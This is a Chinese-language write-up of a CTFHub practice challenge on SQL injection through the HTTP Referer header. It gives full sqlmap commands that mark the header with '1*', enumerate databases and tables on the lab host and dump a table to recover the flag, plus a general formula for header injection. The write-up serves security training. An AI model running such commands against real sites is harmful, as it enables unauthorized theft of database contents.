【CTFHub】Web-SQL注入Referer注入 Writeup

操作者：何芊宏 | 操作日期：2026.9.25 | 分类：CTF | 标签：CTFHub, Web, SQL注入, Referer注入, SQLmap

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - SQL注入 / Referer注入
  • 题目名称：Referer注入
  • 环境：通过 Open Browser 打开外部浏览器访问靶场环境。
  • 目标：注入点隐藏在 HTTP 请求头的 Referer 字段中。需要配合 SQLmap 工具，指定 Referer 头部作为注入位置，最终获取 Flag。

2. 解题思路与知识点

什么是 Referer 注入？

Referer（来源页）是 HTTP 请求头的一部分，用于标识当前请求是从哪个页面链接过来的。如果后端代码将其直接拼接到 SQL 语句中而未做过滤，就会形成漏洞。

Referer 注入与 UA 注入的核心对比：
  • 相同点（本质一致）：两者都是 HTTP 请求头注入。注入点都不在 URL 或 Cookie，需要使用工具（BP 或 SQLmap）修改请求头。脱库流程（查库 -> 查表 -> 查字段 -> 拿数据）完全一致。
  • 不同点（HTTP 字段职责）：
    • User-Agent：标识客户端（浏览器、操作系统）的身份信息。
    • Referer：标识当前请求的来源页面地址。
  • 不同点（SQLmap 参数）：UA 注入用 --user-agent="1*"；Referer 注入用 --referer="1*"。星号 * 是 SQLmap 定位注入点的“瞄准镜”。
SQLmap 操作：
  • python sqlmap.py：运行 SQLmap 主程序。
  • -u "URL"：指定目标 URL。
  • --referer="1*"：本关核心参数。将 Referer 请求头指定为 1*，星号 * 是注入点标记，告诉工具将 Payload 全部替换到星号位置进行测试。
  • --dbs：查询目标服务器上的所有数据库名。
  • -D "sqli"：指定目标数据库名为 sqli。
  • -T "lctmhcnhgt"：指定目标表名为 lctmhcnhgt。
  • --dump：导出数据，自动查字段名并输出表内全部数据。
  • --batch：全自动模式，无需人工干预。
  • --threads=1：强制单线程，防止脆弱的靶场环境崩溃。

3. 操作步骤

第一步：探测注入点与库名

Payload： python sqlmap.py -u "http://challenge-b4a7a05c742f04e6.sandbox.ctfhub.com:10800/" --referer="1*" --dbs --batch --threads=1

执行目的：测试 Referer 头部是否存在 SQL 注入，并获取所有数据库名。

回显结果：成功跑出 information_schema、mysql、performance_schema 和 sqli。

获得信息：确认注入成功，当前目标数据库为 sqli。

第二步：查表名

Payload： python sqlmap.py -u "http://challenge-b4a7a05c742f04e6.sandbox.ctfhub.com:10800/" --referer="1*" -D "sqli" --tables --batch --threads=1

执行目的：获取 sqli 库下的所有表名。

回显结果：列出 news 和随机表名 lctmhcnhgt。

获得信息：确认目标表名为 lctmhcnhgt，news 为干扰项。

第三步：一键脱库拿 Flag

Payload： python sqlmap.py -u "http://challenge-b4a7a05c742f04e6.sandbox.ctfhub.com:10800/" --referer="1*" -D "sqli" -T "lctmhcnhgt" --dump --batch --threads=1

执行目的：指定库名和表名，使用 --dump 自动猜测字段名并导出表内全部数据。

回显结果：终端打印数据表，输出 ctfhub{4586702de302650bce4e0356}。

获得信息：成功提取 Flag，提交至 CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：注入点的多样化。URL、Cookie、User-Agent、Referer 都有可能成为注入点。面对非标准位置的注入，要快速判断其对应的 HTTP 头部字段。
  • 坑2：SQLmap 参数格式。--referer="1*" 中的星号 * 极其重要。没有它，SQLmap 不知道注入点在哪儿，会导致无法识别注入。
  • 坑3：靶场环境不稳定。必须加上 --threads=1。如果连接被强制关闭，重启环境并重新执行命令即可，这不是 Payload 问题。

5. 知识总结

  • HTTP 头部注入通用公式：工具参数（如 --referer 或 --user-agent）后接="1*"，即可让 SQLmap 自动测试该头部是否存在注入漏洞。
  • SQLmap 核心参数回顾：熟记 -u (URL)、--dbs (库)、-D (指定库)、--tables (表)、-T (指定表)、--dump (导出数据)。
  • 实战操作认知：工具在处理非标准位置注入时（配合 * 标记）具有天然优势，能稳定、高效地完成自动化脱库。
